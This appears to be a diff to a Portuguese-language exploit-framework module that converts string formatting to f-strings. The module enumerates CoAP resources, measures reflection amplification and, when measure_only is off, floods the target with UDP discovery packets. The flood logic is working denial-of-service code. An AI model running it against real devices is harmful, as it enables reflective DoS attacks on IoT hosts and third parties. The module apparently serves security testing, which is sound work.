@@ -136,25 +136,25 @@ class Exploit(Exploit):
     @multi
     def run(self):
         """Enumera recursos CoAP e mede fator de amplificação."""
-        print_status("Enumeração CoAP em {}:{}".format(self.target, self.port))
+        print_status(f"Enumeração CoAP em {self.target}:{self.port}")
 
         req_sz, resp_sz, resp_data = self._send_probe()
         if resp_sz == 0:
-            print_error("Sem resposta CoAP de {}:{}".format(self.target, self.port))
+            print_error(f"Sem resposta CoAP de {self.target}:{self.port}")
             return
 
-        print_success("Servidor CoAP respondeu ({} bytes)".format(resp_sz))
+        print_success(f"Servidor CoAP respondeu ({resp_sz} bytes)")
 
         resources = _parse_link_format(resp_data[4:] if len(resp_data) > 4 else resp_data)
         if resources:
-            print_info("{} recurso(s) descoberto(s) via /.well-known/core".format(len(resources)))
+            print_info(f"{len(resources)} recurso(s) descoberto(s) via /.well-known/core")
             headers = ["URI", "Atributos"]
             rows = [(r["uri"], "; ".join(r["attrs"])) for r in resources]
             print_table(headers, *rows)
         else:
-            print_info("Resposta raw ({} bytes): {}".format(resp_sz, resp_data[:60].hex()))
+            print_info(f"Resposta raw ({resp_sz} bytes): {resp_data[:60].hex()}")
 
-        print_status("Medindo fator de amplificação ({} probes)...".format(self.probe_count))
+        print_status(f"Medindo fator de amplificação ({self.probe_count} probes)...")
         results = []
         for _ in range(int(self.probe_count)):
             rq, rs, _ = self._send_probe()
@@ -167,18 +167,16 @@ class Exploit(Exploit):
             avg_resp = sum(r[1] for r in results) / len(results)
             headers = ["Probe", "Req (B)", "Resp (B)", "Amplificação"]
             rows = [(str(i + 1), str(r[0]), str(r[1]),
-                     "{:.1f}x".format(r[1] / max(r[0], 1))) for i, r in enumerate(results)]
+                     f"{r[1] / max(r[0], 1):.1f}x") for i, r in enumerate(results)]
             print_table(headers, *rows)
-            print_info("Fator médio de amplificação: {:.1f}x ({:.0f}B req -> {:.0f}B resp)".format(
-                avg_amp, results[0][0], avg_resp))
+            print_info(f"Fator médio de amplificação: {avg_amp:.1f}x ({results[0][0]:.0f}B req -> {avg_resp:.0f}B resp)")
             if avg_amp >= 10:
                 print_warning("ALTO fator de amplificação (>= 10x) — risco elevado de DoS reflexivo")
             elif avg_amp >= 3:
                 print_warning("Fator de amplificação MODERADO (>= 3x)")
 
         if not self.measure_only:
-            print_status("Enviando {} pacotes de amplificação (delay={:.3f}s)...".format(
-                self.flood_count, float(self.flood_delay)))
+            print_status(f"Enviando {self.flood_count} pacotes de amplificação (delay={float(self.flood_delay):.3f}s)...")
             pkt = _build_discovery_request(_TYPE_NON)
             sent, total_bytes = 0, 0
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -191,6 +189,6 @@ class Exploit(Exploit):
                         time.sleep(float(self.flood_delay))
             finally:
                 sock.close()
-            print_info("Enviados: {} pacotes | {} bytes".format(sent, total_bytes))
+            print_info(f"Enviados: {sent} pacotes | {total_bytes} bytes")
         else:
             print_info("Modo measure_only=true; defina measure_only=false para flood")
